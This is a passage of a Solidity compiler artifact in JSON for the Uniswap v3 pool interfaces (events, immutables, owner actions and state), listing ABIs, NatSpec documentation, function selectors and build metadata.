					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"}],\"devdoc\":{\"methods\":{},\"title\":\"Events emitted by a pool\"},\"userdoc\":{\"methods\":{},\"notice\":\"Contains all events emitted by the pool\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":\"IUniswapV3PoolEvents\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {},
						"notice": "Contains all events emitted by the pool"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"IUniswapV3PoolImmutables": {
					"abi": [
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							}
						},
						"title": "Pool state that never changes"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"maxLiquidityPerTick()": "70cf754a",
							"tickSpacing()": "d0c93a7c",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}}},\"title\":\"Pool state that never changes\"},\"userdoc\":{\"methods\":{\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"These parameters are fixed for a pool forever, i.e., the methods will always return the same values\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":\"IUniswapV3PoolImmutables\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "These parameters are fixed for a pool forever, i.e., the methods will always return the same values"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"IUniswapV3PoolOwnerActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							}
						},
						"title": "Permissioned pool actions"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"setFeeProtocol(uint8,uint8)": "8206a4d1"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}}},\"title\":\"Permissioned pool actions\"},\"userdoc\":{\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"}},\"notice\":\"Contains pool methods that may only be called by the factory owner\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":\"IUniswapV3PoolOwnerActions\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							}
						},
						"notice": "Contains pool methods that may only be called by the factory owner"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"IUniswapV3PoolState": {
					"abi": [
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							}
						},
						"title": "Pool state that can change"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"liquidity()": "1a686502",
							"observations(uint256)": "252c09d7",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"slot0()": "3850c7bd",
							"tickBitmap(int16)": "5339c296",
							"ticks(int24)": "f30dba93"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of 